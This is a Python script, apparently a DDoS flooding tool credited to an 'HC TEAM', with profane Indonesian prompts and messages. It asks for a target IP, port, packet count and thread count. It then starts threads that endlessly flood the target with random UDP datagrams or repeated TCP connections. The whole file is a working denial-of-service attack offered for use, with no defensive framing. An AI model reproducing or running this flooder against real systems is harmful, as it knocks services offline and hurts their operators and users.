import random
import socket
import threading
import os
import time

print("TUNGGU 5 DETIK KONTOL JANGAN BURU-BURU AWAS KALAU ABUSE LU KONTOL JANGAN DI SEBAR TOOL INI BUAT TEAM  ")
time.sleep(6)
os.system("clear")
print("\033[93m")

print("""
 ██░ ██  ▄████▄                     
▓██░ ██▒▒██▀ ▀█                     
▒██▀▀██░▒▓█    ▄                    
░▓█ ░██ ▒▓▓▄ ▄██▒                   
░▓█▒░██▓▒ ▓███▀ ░                   
 ▒ ░░▒░▒░ ░▒ ▒  ░                   
 ▒ ░▒░ ░  ░  ▒                      
 ░  ░░ ░░                           
 ░  ░  ░░ ░                         
        ░                           
▄▄▄█████▓▓█████ ▄▄▄       ███▄ ▄███▓
▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒
▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▓██    ▓██░
░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██ 
  ▒██▒ ░ ░▒████▒▓█   ▓██▒▒██▒   ░██▒
  ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░
    ░     ░ ░  ░ ▒   ▒▒ ░░  ░      ░
  ░         ░    ░   ▒   ░      ░   
            ░  ░     ░  ░       ░
""")

print("\033[97m")
ip = str(input("IP | NYA | TOLOL ======>:"))
port = int(input("PORT | NYA | ASU ======>:"))
choice = str(input("GAS DDOS?(y/n):"))
times = int(input("PACKETS | NYA ======>:"))
threads = int(input("BONUS | PACKETS ======>:"))
def run():
	data = random._urandom(1555)
	i = random.choice(("[PAKET NI!!]","[PAKET NI!!]","[PAKET NI!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" HC TEAM NI DEK!!!")
		except:
			print("[!] YE DOWN KONTOL!!!")

def run2():
	data = random._urandom(55)
	i = random.choice(("[PAKET NI!!]","[PAKET NI!!]","[PAKET NI!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"HC TEAM NI DEK YAHAHA!!!")
		except:
			s.close()
			print("[*] YE DOWN KONTOL")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
